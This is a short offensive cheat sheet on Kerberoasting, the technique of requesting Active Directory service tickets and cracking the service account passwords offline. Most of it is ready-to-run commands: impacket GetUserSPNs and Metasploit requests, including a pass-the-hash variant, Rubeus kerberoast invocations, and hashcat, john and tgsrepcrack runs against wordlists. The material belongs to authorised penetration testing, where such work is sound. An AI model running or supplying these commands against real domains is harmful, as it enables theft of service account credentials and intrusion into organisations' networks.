# Kerberoasting

The goal of **Kerberoasting** is to harvest **TGS tickets for services that run on behalf of user accounts** in the AD, not computer accounts. Thus, **part** of these TGS **tickets are** **encrypted** with **keys** derived from user passwords. As a consequence, their credentials could be **cracked offline**.\
You can know that a **user account** is being used as a **service** because the property **"ServicePrincipalName"** is **not null**.

Therefore, to perform Kerberoasting, only a domain account that can request for TGSs is necessary, which is anyone since no special privileges are required.

**You need valid credentials inside the domain.**

```
msf> use auxiliary/gather/get_user_spns
impacket-GetUserSPNs <DOMAIN.local/username:password> -dc-ip 192.168.183.134 -request
GetUserSPNs.py -request -dc-ip 192.168.2.160 <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip 192.168.2.160 -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
```

### Rubeus

```
.\Rubeus.exe kerberoast /nowrap
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user

hashcat -m 13100 -a 0 hash /usr/share/wordlists/rockyou.txt --force
```

#### Cracking passwords

```
hashcat -m 13100 --force <TGSs_file> /usr/share/wordlists/rockyou.txt
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
